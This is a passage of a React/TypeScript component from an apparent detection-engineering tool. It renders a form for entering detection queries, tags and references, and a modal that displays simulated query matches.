                        rel="noopener noreferrer"
                        className="text-xs px-2 py-1 bg-blue-500/10 text-blue-400 rounded hover:bg-blue-500/20 transition-colors flex items-center gap-1"
                      >
                        {doc.title}
                        <ExternalLink className="w-3 h-3" />
                      </a>
                    ))}
                  </div>
                </div>
              )}

              <div>
                <label className="block text-sm text-gray-400 mb-2">
                  Detection Query ({PLATFORMS[formData.platform as keyof typeof PLATFORMS]?.language || 'Custom'}) *
                </label>
                <div className="relative">
                  <textarea
                    value={formData.query}
                    onChange={(e) => setFormData({...formData, query: e.target.value})}
                    placeholder={`Enter your ${PLATFORMS[formData.platform as keyof typeof PLATFORMS]?.language || ''} query...`}
                    rows={12}
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none font-mono text-sm"
                  />
                  <div className="absolute top-2 right-2 flex gap-2">
                    <button 
                      onClick={() => handleCopy(formData.query || '', 'wizard')}
                      className="p-1.5 bg-slate-800 rounded text-gray-400 hover:text-white transition-colors"
                      title="Copy query"
                    >
                      {copiedId === 'wizard' ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
                <p className="text-xs text-gray-500 mt-1">
                  Syntax: {PLATFORMS[formData.platform as keyof typeof PLATFORMS]?.syntax.functions.join(', ') || 'Custom'}
                </p>
              </div>

              <div>
                <label className="block text-sm text-gray-400 mb-2">Tags (comma separated)</label>
                <input
                  type="text"
                  value={formData.tags?.join(', ')}
                  onChange={(e) => setFormData({...formData, tags: e.target.value.split(',').map(t => t.trim()).filter(Boolean)})}
                  placeholder="red-team, apt, html-smuggling"
                  className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-sm text-gray-400 mb-2">References</label>
                <input
                  type="text"
                  value={formData.references?.join(', ')}
                  onChange={(e) => setFormData({...formData, references: e.target.value.split(',').map(t => t.trim()).filter(Boolean)})}
                  placeholder="https://kypvas.github.io/red-team-map/, https://lolbas-project.github.io/"
                  className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                />
              </div>
            </div>
            <div className="flex items-center justify-end gap-3 p-6 border-t border-white/5">
              <button onClick={() => setShowWizard(false)} className="px-4 py-2 bg-white/5 border border-white/10 rounded-lg text-sm font-medium hover:bg-white/10 transition-colors">
                Cancel
              </button>
              <button 
                onClick={handleSave}
                disabled={!formData.name || !formData.query}
                className="px-4 py-2 bg-gradient-to-r from-cyan-400 to-cyan-600 rounded-lg text-black font-medium hover:shadow-lg hover:shadow-cyan-500/25 transition-all disabled:opacity-50 flex items-center gap-2"
              >
                <Save className="w-4 h-4" />
                {editingUseCase ? 'Save Changes' : 'Create Use Case'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Simulation Result Modal */}
      {simulationResult && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-3xl">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center">
                  <CheckCircle className="w-5 h-5 text-green-400" />
                </div>
                <div>
                  <h2 className="text-xl font-semibold">Simulation Complete</h2>
                  <p className="text-sm text-gray-400">Platform: {simulationResult.platform}</p>
                </div>
              </div>
              <button onClick={() => setSimulationResult(null)} className="text-gray-400 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6">
              <div className="grid grid-cols-3 gap-4 mb-6">
                <div className="bg-white/5 rounded-xl p-4 text-center">
                  <p className="text-3xl font-bold text-cyan-400">{simulationResult.matchedEvents}</p>
                  <p className="text-sm text-gray-400">Matched Events</p>
                </div>
                <div className="bg-white/5 rounded-xl p-4 text-center">
                  <p className="text-3xl font-bold text-green-400">{simulationResult.executionTime}s</p>
                  <p className="text-sm text-gray-400">Execution Time</p>
                </div>
                <div className="bg-white/5 rounded-xl p-4 text-center">
                  <p className="text-3xl font-bold text-purple-400">{simulationResult.sampleMatches.length}</p>
                  <p className="text-sm text-gray-400">Sample Matches</p>
                </div>
              </div>
              <h3 className="font-semibold mb-3 text-white">Sample Matches</h3>
              <div className="space-y-2 max-h-64 overflow-y-auto">
                {simulationResult.sampleMatches.map((match: any, idx: number) => (
                  <div key={idx} className="p-3 rounded-lg bg-white/5 text-sm border border-white/5">
                    <div className="grid grid-cols-2 gap-2 mb-2">
                      <span className="font-mono text-cyan-400">{match.time}</span>
                      <span className="text-gray-400">{match.source}</span>
                    </div>
                    <div className="text-gray-300 font-mono text-xs bg-black/30 p-2 rounded overflow-x-auto">
                      {match.command}
                    </div>
                  </div>
                ))}
              </div>
            </div>
            <div className="flex items-center justify-end gap-3 p-6 border-t border-white/5">
              <button onClick={() => setSimulationResult(null)} className="px-4 py-2 bg-gradient-to-r from-cyan-400 to-cyan-600 rounded-lg text-black font-medium">
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}